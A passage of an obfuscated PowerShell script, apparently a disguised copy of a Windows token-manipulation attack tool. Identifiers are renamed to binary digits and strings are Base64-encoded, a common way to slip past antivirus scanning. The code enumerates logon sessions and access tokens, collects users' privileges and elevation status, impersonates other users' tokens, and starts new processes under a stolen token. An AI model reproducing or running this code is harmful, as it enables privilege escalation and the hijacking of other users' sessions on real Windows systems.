            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAIABjAG8AZABlADoAIAAkAHsAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMAAwADAAMAAwAH0A')))
        }
        else
        {
            ${01011011001100100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10100000010010101}, [Type]${10100110011010111})
            ${01001001101001101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${00101000100001011}))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr(${01011011001100100}.AuthenticationId, ${01001001101001101}, $false)
            [IntPtr]${01110111001110110} = [IntPtr]::Zero
            ${01111010010000010} = ${01110100100100001}.Invoke(${01001001101001101}, [Ref]${01110111001110110})
            if (${01111010010000010} -ne 0 -and ${01110111001110110} -eq [IntPtr]::Zero)
            {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEwAcwBhAEcAZQB0AEwAbwBnAG8AbgBTAGUAcwBzAGkAbwBuAEQAYQB0AGEAIABmAGEAaQBsAGUAZAAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7ADAAMQAxADEAMQAwADEAMAAwADEAMAAwADAAMAAwADEAMAB9AC4AIABMAG8AZwBvAG4AUwBlAHMAcwBpAG8AbgBEAGEAdABhAFAAdAByACAAPQAgACQAewAwADEAMQAxADAAMQAxADEAMAAwADEAMQAxADAAMQAxADAAfQA=')))
            }
            else
            {
                ${01100101110011011} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01110111001110110}, [Type]${10111001000111001})
                if (${01100101110011011}.Username.Buffer -ne [IntPtr]::Zero -and
                    ${01100101110011011}.LoginDomain.Buffer -ne [IntPtr]::Zero)
                {
                    $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${01100101110011011}.Username.Buffer, ${01100101110011011}.Username.Length/2)
                    ${10100010111001100} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${01100101110011011}.LoginDomain.Buffer, ${01100101110011011}.LoginDomain.Length/2)
                    if ($Username -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]${00011100011001111} = 100
                        [UInt32]${00111001000111111} = ${00011100011001111} / 2
                        [UInt32]${00110010100000111} = ${00011100011001111} / 2
                        [UInt32]${10010111011101111} = 0
                        ${10101010010110010} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00011100011001111})
                        ${00111010010101111} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00011100011001111})
                        ${10101100100110000} = ${10110101111101111}.Invoke([IntPtr]::Zero, ${01100101110011011}.Sid, ${10101010010110010}, [Ref]${00111001000111111}, ${00111010010101111}, [Ref]${00110010100000111}, [Ref]${10010111011101111})
                        if (${10101100100110000})
                        {
                            $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${10101010010110010})
                            ${10100010111001100} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${00111010010101111})
                        }
                        else
                        {
                            ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwBhAGwAbABpAG4AZwAgAEwAbwBvAGsAdQBwAEEAYwBjAG8AdQBuAHQAUwBpAGQAVwAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7ADAAMQAxADEAMAAwADEAMAAxADAAMQAxADAAMAAwADAAMAB9AA==')))
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10101010010110010})
                        ${10101010010110010} = [IntPtr]::Zero
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${00111010010101111})
                        ${00111010010101111} = [IntPtr]::Zero
                    }
                    ${10100111101000110} = New-Object PSObject
                    ${10100111101000110} | Add-Member -Type NoteProperty -Name Domain -Value ${10100010111001100}
                    ${10100111101000110} | Add-Member -Type NoteProperty -Name Username -Value $Username
                    ${10100111101000110} | Add-Member -Type NoteProperty -Name hToken -Value ${_10111010100010000}
                    ${10100111101000110} | Add-Member -Type NoteProperty -Name LogonType -Value ${01100101110011011}.LogonType
                    ${10100111101000110} | Add-Member -Type NoteProperty -Name IsElevated -Value $false
                    ${00010101001001111} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${00010011100010100})
                    ${00011000101100111} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00010101001001111})
                    [UInt32]${10111000100000001} = 0
                    ${10101100100110000} = ${00000001010001110}.Invoke(${_10111010100010000}, ${10010010001100101}::TokenElevation, ${00011000101100111}, ${00010101001001111}, [Ref]${10111000100000001})
                    if (-not ${10101100100110000})
                    {
                        ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuAEUAbABlAHYAYQB0AGkAbwBuACAAcwB0AGEAdAB1AHMALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMAAwADAAMAAwAH0A')))
                    }
                    else
                    {
                        ${01001110100011100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00011000101100111}, [Type]${00010011100010100})
                        if (${01001110100011100}.TokenIsElevated -ne 0)
                        {
                            ${10100111101000110}.IsElevated = $true
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${00011000101100111})
                    ${10100111101000110} | Add-Member -Type NoteProperty -Name TokenType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAVABvAFIAZQB0AHIAaQBlAHYAZQA=')))
                    [UInt32]${00101101010111000} = 4
                    [IntPtr]${10010010101101000} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00101101010111000})
                    [UInt32]${10111000100000001} = 0
                    ${10101100100110000} = ${00000001010001110}.Invoke(${_10111010100010000}, ${10010010001100101}::TokenType, ${10010010101101000}, ${00101101010111000}, [Ref]${10111000100000001})
                    if (-not ${10101100100110000})
                    {
                        ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsACAAcwB0AGEAdAB1AHMALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMAAwADAAMAAwAH0A')))
                    }
                    else
                    {
                        [UInt32]${01011010000000110} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10010010101101000}, [Type][UInt32])
                        switch(${01011010000000110})
                        {
                            1 {${10100111101000110}.TokenType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbQBhAHIAeQA=')))}
                            2 {${10100111101000110}.TokenType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA=')))}
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10010010101101000})
                    if (${10100111101000110}.TokenType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA='))))
                    {
                        ${10100111101000110} | Add-Member -Type NoteProperty -Name ImpersonationLevel -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAVABvAFIAZQB0AHIAaQBlAHYAZQA=')))
                        [UInt32]${01000111101110100} = 4
                        [IntPtr]${10101111001111001} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01000111101110100}) 
                        [UInt32]${10111000100000001} = 0
                        ${10101100100110000} = ${00000001010001110}.Invoke(${_10111010100010000}, ${10010010001100101}::TokenImpersonationLevel, ${10101111001111001}, ${01000111101110100}, [Ref]${10111000100000001})
                        if (-not ${10101100100110000})
                        {
                            ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsACAAcwB0AGEAdAB1AHMALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMAAwADAAMAAwAH0A')))
                        }
                        else
                        {
                            [UInt32]${10101111001111110} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10101111001111001}, [Type][UInt32])
                            switch (${10101111001111110})
                            {
                                0 { ${10100111101000110}.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEEAbgBvAG4AeQBtAG8AdQBzAA=='))) }
                                1 { ${10100111101000110}.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBjAGEAdABpAG8AbgA='))) }
                                2 { ${10100111101000110}.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4A'))) }
                                3 { ${10100111101000110}.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEQAZQBsAGUAZwBhAHQAaQBvAG4A'))) }
                            }
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10101111001111001})
                    }
                    ${10100111101000110} | Add-Member -Type NoteProperty -Name SessionID -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA=')))
                    [UInt32]${01110111111111111} = 4
                    [IntPtr]${01100000011010010} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01110111111111111})
                    [UInt32]${10111000100000001} = 0
                    ${10101100100110000} = ${00000001010001110}.Invoke(${_10111010100010000}, ${10010010001100101}::TokenSessionId, ${01100000011010010}, ${01110111111111111}, [Ref]${10111000100000001})
                    if (-not ${10101100100110000})
                    {
                        ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuACAAUwBlAHMAcwBpAG8AbgBJAGQALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMAAwADAAMAAwAH0A')))
                    }
                    else
                    {
                        [UInt32]${10100110110010101} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01100000011010010}, [Type][UInt32])
                        ${10100111101000110}.SessionID = ${10100110110010101}
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${01100000011010010})
                    ${10100111101000110} | Add-Member -Type NoteProperty -Name PrivilegesEnabled -Value @()
                    ${10100111101000110} | Add-Member -Type NoteProperty -Name PrivilegesAvailable -Value @()
                    [UInt32]${00010110011010101} = 1000
                    [IntPtr]${10111001010011110} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00010110011010101})
                    [UInt32]${10111000100000001} = 0
                    ${10101100100110000} = ${00000001010001110}.Invoke(${_10111010100010000}, ${10010010001100101}::TokenPrivileges, ${10111001010011110}, ${00010110011010101}, [Ref]${10111000100000001})
                    if (-not ${10101100100110000})
                    {
                        ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVABvAGsAZQBuACAAUwBlAHMAcwBpAG8AbgBJAGQALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMAAwADAAMAAwAH0A')))
                    }
                    else
                    {
                        ${01110101101101111} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10111001010011110}, [Type]${01010011001011000})
                        [IntPtr]${10111111000011011} = [IntPtr](_00000011000000010 ${10111001010011110} ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]${01010011001011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))))))
                        ${00110100011110001} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${10011001101111011})
                        for (${10001001010101000} = 0; ${10001001010101000} -lt ${01110101101101111}.PrivilegeCount; ${10001001010101000}++)
                        {
                            ${10000111110010010} = [IntPtr](_00000011000000010 ${10111111000011011} (${00110100011110001} * ${10001001010101000}))
                            ${10110001110101000} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10000111110010010}, [Type]${10011001101111011})
                            [UInt32]${10111001000010011} = 60
                            ${10111010011010011} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10111001000010011})
                            ${01011111101101100} = ${10000111110010010} 
                            ${10101100100110000} = ${10110110010111011}.Invoke([IntPtr]::Zero, ${01011111101101100}, ${10111010011010011}, [Ref]${10111001000010011})
                            if (-not ${10101100100110000})
                            {
                                ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEwAbwBvAGsAdQBwAFAAcgBpAHYAaQBsAGUAZwBlAE4AYQBtAGUAVwAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAIABjAG8AZABlADoAIAAkAHsAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMAAwADAAMAAwAH0ALgAgAFIAZQBhAGwAUwBpAHoAZQA6ACAAJAB7ADEAMAAxADEAMQAwADAAMQAwADAAMAAwADEAMAAwADEAMQB9AA==')))
                            }
                            ${00100111101101001} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${10111010011010011})
                            ${10001110111000001} = ""
                            ${10011110000001111} = $false
                            if (${10110001110101000}.Attributes -eq 0)
                            {
                                ${10011110000001111} = $false
                            }
                            if ((${10110001110101000}.Attributes -band ${01101010111011110}.SE_PRIVILEGE_ENABLED_BY_DEFAULT) -eq ${01101010111011110}.SE_PRIVILEGE_ENABLED_BY_DEFAULT) 
                            {
                                ${10011110000001111} = $true
                            }
                            if ((${10110001110101000}.Attributes -band ${01101010111011110}.SE_PRIVILEGE_ENABLED) -eq ${01101010111011110}.SE_PRIVILEGE_ENABLED) 
                            {
                                ${10011110000001111} = $true
                            }
                            if ((${10110001110101000}.Attributes -band ${01101010111011110}.SE_PRIVILEGE_REMOVED) -eq ${01101010111011110}.SE_PRIVILEGE_REMOVED) 
                            {
                                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGUAeABwAGUAYwB0AGUAZAAgAGIAZQBoAGEAdgBpAG8AcgA6ACAARgBvAHUAbgBkACAAYQAgAHQAbwBrAGUAbgAgAHcAaQB0AGgAIABTAEUAXwBQAFIASQBWAEkATABFAEcARQBfAFIARQBNAE8AVgBFAEQALgAgAFAAbABlAGEAcwBlACAAcgBlAHAAbwByAHQAIAB0AGgAaQBzACAAYQBzACAAYQAgAGIAdQBnAC4AIAA=')))
                            }
                            if (${10011110000001111})
                            {
                                ${10100111101000110}.PrivilegesEnabled += ,${00100111101101001}
                            }
                            else
                            {
                                ${10100111101000110}.PrivilegesAvailable += ,${00100111101101001}
                            }
                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10111010011010011})
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10111001010011110})
                }
                else
                {
                    Write-Verbose "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $(${01100101110011011}.UserName.Length)"
                }
                ${00111111111101010} = ${01101000110100010}.Invoke(${01110111001110110})
                ${01110111001110110} = [IntPtr]::Zero
                if (${00111111111101010} -ne 0)
                {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEwAcwBhAEYAcgBlAGUAUgBlAHQAdQByAG4AQgB1AGYAZgBlAHIAIABmAGEAaQBsAGUAZAAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7ADAAMAAxADEAMQAxADEAMQAxADEAMQAxADAAMQAwADEAMAB9AA==')))
                }
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${01001001101001101})
            ${01001001101001101} = [IntPtr]::Zero
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10100000010010101})
        ${10100000010010101} = [IntPtr]::Zero
        return ${10100111101000110}
    }
    function _01110001001010001
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [Object[]]
            ${_01011000110110011}
        )
        ${10011000001111000} = @{}
        ${10001010101000010} = @{}
        ${10001100110111001} = @{}
        foreach (${01110000001110010} in ${_01011000110110011})
        {
            ${00100110111011110} = ${01110000001110010}.Domain + "\" + ${01110000001110010}.Username
            if (-not ${10011000001111000}.ContainsKey(${00100110111011110}))
            {
                if (${01110000001110010}.LogonType -ne 3 -and
                    ${01110000001110010}.Username -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBEAFcATQAtAFwAZAArACQA'))) -and
                    ${01110000001110010}.Username -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBMAE8AQwBBAEwAXABzAFMARQBSAFYASQBDAEUAJAA='))))
                {
                    ${10011000001111000}.Add(${00100110111011110}, ${01110000001110010})
                }
            }
            else
            {
                if(${01110000001110010}.IsElevated -eq ${10011000001111000}[${00100110111011110}].IsElevated)
                {
                    if ((${01110000001110010}.PrivilegesEnabled.Count + ${01110000001110010}.PrivilegesAvailable.Count) -gt (${10011000001111000}[${00100110111011110}].PrivilegesEnabled.Count + ${10011000001111000}[${00100110111011110}].PrivilegesAvailable.Count))
                    {
                        ${10011000001111000}[${00100110111011110}] = ${01110000001110010}
                    }
                }
                elseif ((${01110000001110010}.IsElevated -eq $true) -and (${10011000001111000}[${00100110111011110}].IsElevated -eq $false))
                {
                    ${10011000001111000}[${00100110111011110}] = ${01110000001110010}
                }
            }
        }
        foreach (${01110000001110010} in ${_01011000110110011})
        {
            ${01110000111010001} = "$(${01110000001110010}.Domain)\$(${01110000001110010}.Username)"
            foreach (${_10010100001010000} in ${01110000001110010}.PrivilegesEnabled)
            {
                if (${10001010101000010}.ContainsKey(${_10010100001010000}))
                {
                    if(${10001010101000010}[${_10010100001010000}] -notcontains ${01110000111010001})
                    {
                        ${10001010101000010}[${_10010100001010000}] += ,${01110000111010001}
                    }
                }
                else
                {
                    ${10001010101000010}.Add(${_10010100001010000}, @(${01110000111010001}))
                }
            }
            foreach (${_10010100001010000} in ${01110000001110010}.PrivilegesAvailable)
            {
                if (${10001100110111001}.ContainsKey(${_10010100001010000}))
                {
                    if(${10001100110111001}[${_10010100001010000}] -notcontains ${01110000111010001})
                    {
                        ${10001100110111001}[${_10010100001010000}] += ,${01110000111010001}
                    }
                }
                else
                {
                    ${10001100110111001}.Add(${_10010100001010000}, @(${01110000111010001}))
                }
            }
        }
        ${00010111000100101} = @{
            TokenByUser = ${10011000001111000}
            TokenByEnabledPriv = ${10001010101000010}
            TokenByAvailablePriv = ${10001100110111001}
        }
        return (New-Object PSObject -Property ${00010111000100101})
    }
    function _00100100100101000
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            ${_10111010100010000}
        )
        [IntPtr]${00110110101110101} = [IntPtr]::Zero
        ${10101100100110000} = ${01111001001110100}.Invoke(${_10111010100010000}, ${01101010111011110}.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]${00110110101110101}) 
        if (-not ${10101100100110000})
        {
            ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AHAAbABpAGMAYQB0AGUAVABvAGsAZQBuAEUAeAAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAQwBvAGQAZQA6ACAAJAB7ADAAMQAxADEAMAAwADEAMAAxADAAMQAxADAAMAAwADAAMAB9AA==')))
        }
        else
        {
            ${10101100100110000} = ${00100110111100110}.Invoke(${00110110101110101})
            if (-not ${10101100100110000})
            {
                ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABJAG0AcABlAHIAcwBvAG4AYQB0AGUATABvAGcAZwBlAGQATwBuAFUAcwBlAHIALgAgAEUAcgByAG8AcgAgAGMAbwBkAGUAOgAgACQAewAwADEAMQAxADAAMAAxADAAMQAwADEAMQAwADAAMAAwADAAfQA=')))
            }
        }
        ${10101100100110000} = ${11000001101111010}.Invoke(${00110110101110101})
        ${00110110101110101} = [IntPtr]::Zero
        if (-not ${10101100100110000})
        {
            ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAEgAYQBuAGQAbABlACAAZgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIABOAGUAdwBIAFQAbwBrAGUAbgAuACAARQByAHIAbwByAEMAbwBkAGUAOgAgACQAewAwADEAMQAxADAAMAAxADAAMQAwADEAMQAwADAAMAAwADAAfQA=')))
        }
        return ${10101100100110000}
    }
    function _00111111101000000
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            ${_10111010100010000},
            [Parameter(Position=1, Mandatory=$true)]
            [String]
            ${_01101001010111110},
            [Parameter(Position=2)]
            [String]
            $ProcessArgs,
            [Parameter(Position=3)]
            [Switch]
            $PassThru
        )
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAGkAbgBnACAAQwByAGUAYQB0AGUALQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgAVABvAGsAZQBuAA==')))
        [IntPtr]${00110110101110101} = [IntPtr]::Zero
        ${10101100100110000} = ${01111001001110100}.Invoke(${_10111010100010000}, ${01101010111011110}.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]${00110110101110101})
        if (-not ${10101100100110000})
        {
            ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AHAAbABpAGMAYQB0AGUAVABvAGsAZQBuAEUAeAAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAQwBvAGQAZQA6ACAAJAB7ADAAMQAxADEAMAAwADEAMAAxADAAMQAxADAAMAAwADAAMAB9AA==')))
        }
        else
        {
            ${10100111000010110} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${01010111001111011})
            [IntPtr]${11000010011100101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10100111000010110})
            ${00001100111010111}.Invoke(${11000010011100101}, 0, ${10100111000010110}) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32(${11000010011100101}, ${10100111000010110}) 
            ${01000001011100010} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${10101000000011000})
            [IntPtr]${01011000110011101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01000001011100010})
            ${10000101100110111} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADEAMAAxADAAMAAxADAAMQAwADEAMQAxADEAMQAwAH0A'))))
            ${10101110100001101} = [IntPtr]::Zero
            if (-not [String]::IsNullOrEmpty($ProcessArgs))
            {
                ${10101110100001101} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgAkAHsAXwAwADEAMQAwADEAMAAwADEAMAAxADAAMQAxADEAMQAxADAAfQAiACAAJABQAHIAbwBjAGUAcwBzAEEAcgBnAHMA'))))
            }
            ${10000000111001100} = ""
            if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
            {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAGkAbgAgAFMAZQBzAHMAaQBvAG4AIAAwAC4AIABFAG4AYQBiAGwAaQBuAGcAIABTAGUAQQBzAHMAaQBnAG4AUAByAGkAbQBhAHIAeQBUAG8AawBlAG4AUAByAGkAdgBpAGwAZQBnAGUAIABhAG4AZAAgAGMAYQBsAGwAaQBuAGcAIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAEEAcwBVAHMAZQByAFcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAGEAIABwAHIAbwBjAGUAcwBzACAAdwBpAHQAaAAgAGEAbAB0AGUAcgBuAGEAdABlACAAdABvAGsAZQBuAC4A')))
                _00010111111111101 -_10010100001010000 SeAssignPrimaryTokenPrivilege
                ${10101100100110000} = ${10011110011111100}.Invoke(${00110110101110101}, ${10000101100110111}, ${10101110100001101}, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, ${11000010011100101}, ${01011000110011101})
                ${10000000111001100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBBAHMAVQBzAGUAcgBXAA==')))
            }
            else
            {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIAByAHUAbgBuAGkAbgBnACAAaQBuACAAUwBlAHMAcwBpAG8AbgAgADAALAAgAGMAYQBsAGwAaQBuAGcAIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgAVABvAGsAZQBuAFcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAGEAIABwAHIAbwBjAGUAcwBzACAAdwBpAHQAaAAgAGEAbAB0AGUAcgBuAGEAdABlACAAdABvAGsAZQBuAC4A')))
                ${10101100100110000} = ${01100001000101111}.Invoke(${00110110101110101}, 0x0, ${10000101100110111}, ${10101110100001101}, 0, [IntPtr]::Zero, [IntPtr]::Zero, ${11000010011100101}, ${01011000110011101})
                ${10000000111001100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBXAGkAdABoAFQAbwBrAGUAbgBXAA==')))
            }
            if (${10101100100110000})
            {
                ${00101000011011001} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01011000110011101}, [Type]${10101000000011000})
                ${11000001101111010}.Invoke(${00101000011011001}.hProcess) | Out-Null
                ${11000001101111010}.Invoke(${00101000011011001}.hThread) | Out-Null
                if ($PassThru) {
                        ${00011110100101101} = ps -Id ${00101000011011001}.dwProcessId
                        $null = ${00011110100101101}.Handle
                        ${00011110100101101}
                }
            }
            else
            {
                ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAwADAAMAAwADAAMAAxADEAMQAwADAAMQAxADAAMAB9ACAAZgBhAGkAbABlAGQALgAgAEUAcgByAG8AcgAgAGMAbwBkAGUAOgAgACQAewAwADEAMQAxADAAMAAxADAAMQAwADEAMQAwADAAMAAwADAAfQA=')))
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${11000010011100101})
            ${11000010011100101} = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${01011000110011101})
